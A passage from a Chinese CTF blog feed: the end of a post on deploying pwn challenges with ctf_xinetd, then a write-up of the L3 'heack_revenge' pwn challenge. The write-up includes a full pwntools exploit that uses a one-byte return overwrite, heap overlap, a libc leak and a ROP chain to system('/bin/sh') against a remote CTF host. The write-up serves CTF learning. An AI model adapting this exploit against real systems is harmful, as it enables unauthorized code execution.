src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124220.png" alt="屏幕截图 2025-07-23 124220"></p></li></ol></li><li><p>在GZ平台上出题的时候将自己github里的镜像pull到平台里即可，记得按照自己镜像里的端口设置端口号</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-23%20124826.png" alt="屏幕截图 2025-07-23 124826"></p></li></ol><p>参考文章：</p><p><a href="[GZ：CTF pwn 出题流程 - Skynion&#39;s World](https://skynionkrz.github.io/2024/08/22/出题流程/#0x04-将容器镜像push到github">链接1</a>)</p><p><a href="[基于xinetd部署pwn题（百分百搭成并且可以nc靶场地址）_ctfd部署pwn题-CSDN博客](https://blog.csdn.net/Myon5/article/details/131763593">链接2</a>)</p><p><a href="[利用ctf_xinetd部署pwn题目的一些细节-先知社区](https://xz.aliyun.com/news/13944">链接3</a>)</p><h2 id="出题完成啦！！！"><a href="#出题完成啦！！！" class="headerlink" title="出题完成啦！！！"></a>出题完成啦！！！</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn 出题 ctf_xinetd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3 pwn</title>
      <link href="/2025/07/20/L3-pwn/"/>
      <url>/2025/07/20/L3-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="heack-revenge"><a href="#heack-revenge" class="headerlink" title="heack_revenge"></a>heack_revenge</h1><p>这个题比赛中没做出来，赛后复现一下</p><ol><li><p>这个题第一步就卡住我了，（<del>我还是太菜了</del>），这个题通过修改索引可以溢出到ret地址，但是最多只能覆盖一个字节，也就是说，要在0x1800~0x1900这段代码内寻找有用的gadget，结果这个题在0x186a这个地方藏了一个pop rbp，这个是解题的关键</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-20%20230952.png" alt=""></p></li></ol><ol><li><p>通过pop rbp之后，调试可以发现，rbp会指向index为0的chunk，而且可以通过修改hp，attack，可以修改chunk头中的size部分，实现堆叠，堆风水布局可以泄露libc和heap</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-21%20100010.png" alt=""></p><p>泄露libc后，在上图rbp指向的chunk中写入rop链，ret时便可以劫持程序执行流，get_shell !!!</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty </span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fight</span>(<span class="params">concent</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;You grip your sword and shout:&#x27;</span>)</span><br><span class="line">    sl(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hp</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">note</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Input your content: &#x27;</span>,concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index,size</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Input your content: &#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">chr</span>(tty.CEOF))</span><br><span class="line">    ru(<span class="string">b&#x27;Read failed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to destroy (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to view (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vul2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;43.138.2.216&#x27;</span>,<span class="number">19999</span>)</span><br><span class="line">note()</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">esc()</span><br><span class="line">fight(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">259</span> - <span class="number">0xe0</span>) + <span class="string">b&#x27;\x37&#x27;</span> + <span class="string">b&#x27;\x6A&#x27;</span>)</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    attack()</span><br><span class="line">note()</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,p64(he(<span class="number">0xb90</span>))+p64(he(<span class="number">0x300</span>)))</span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">rdi=li(<span class="number">0x000000000010f75b</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi+<span class="number">1</span>)*<span class="number">0x81</span>+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x480</span>,payload)</span><br><span class="line">esc()</span><br><span class="line">ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>(我的堆风水比较麻烦，官方wp堆风水只需要泄露libc即可，不需要泄露heap，<a href="https://hust-l3hsec.feishu.cn/wiki/WjlUwIAahiXhlykwIe7c5V57nPb">官方wp</a>)</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
            <tag> L3 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
